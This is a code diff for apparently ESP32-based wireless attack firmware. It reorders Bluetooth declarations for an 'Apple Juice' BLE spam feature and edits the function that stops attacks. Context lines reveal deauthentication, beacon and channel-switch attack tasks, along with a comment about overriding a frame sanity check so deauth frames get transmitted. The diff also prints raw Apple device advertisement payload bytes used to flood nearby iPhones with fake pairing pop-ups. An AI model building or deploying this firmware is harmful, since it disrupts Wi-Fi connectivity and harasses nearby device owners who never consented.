@@ -83,6 +83,9 @@ volatile LedState ledState = LS_OFF;
 #include <Preferences.h>
 #include <Adafruit_NeoPixel.h>
 #include "web_content.h"
+#include <BLEDevice.h>
+#include <BLEUtils.h>
+#include <BLEServer.h>
 
 // ── FRAME SANITY OVERRIDE ─────────────────────────────────────────────────────
 // v3.0 HARD OVERRIDE — must return 0 or deauth never leaves radio
@@ -199,6 +202,11 @@ TaskHandle_t promiscTaskHandle   = NULL;
 TaskHandle_t beaconTaskHandle    = NULL;
 TaskHandle_t csaTaskHandle       = NULL;
 TaskHandle_t applejuiceTaskHandle = NULL;
+
+// Apple Juice forward (declared early so stopAllAttacks can see them)
+class BLEAdvertising;  // forward
+static BLEAdvertising* ajAdv = nullptr;
+static volatile bool ajRunning = false;
 
 uint8_t  targetBSSID[6]  = {0};
 uint8_t  targetClient[6] = {0};
@@ -1016,7 +1024,7 @@ void stopAllAttacks() {
   if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
     stopRequested = true;
     ajRunning = false;
-    if (ajAdv) ajAdv->stop();
+    // ajAdv->stop() done inside applejuice_task on exit
     xSemaphoreGive(attackMutex);
   }
 
@@ -1168,10 +1176,6 @@ String performClientScan() {
 // ─── WEB SERVER ──────────────────────────────────────────────────────────────
 
 // ─── APPLE JUICE (BLE spam) ──────────────────────────────────────────────────
-#include <BLEDevice.h>
-#include <BLEUtils.h>
-#include <BLEServer.h>
-
 // AirPods / Beats / AppleTV payloads (from electronicminer apple-juice)
 static const uint8_t AJ_DEVICES[][31] = {
   {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
@@ -1205,8 +1209,6 @@ static const uint8_t AJ_SHORT[][23] = {
   {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x24,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
 };
 
-static BLEAdvertising* ajAdv = nullptr;
-static volatile bool ajRunning = false;
 
 void stopAppleJuice() {
   ajRunning = false;
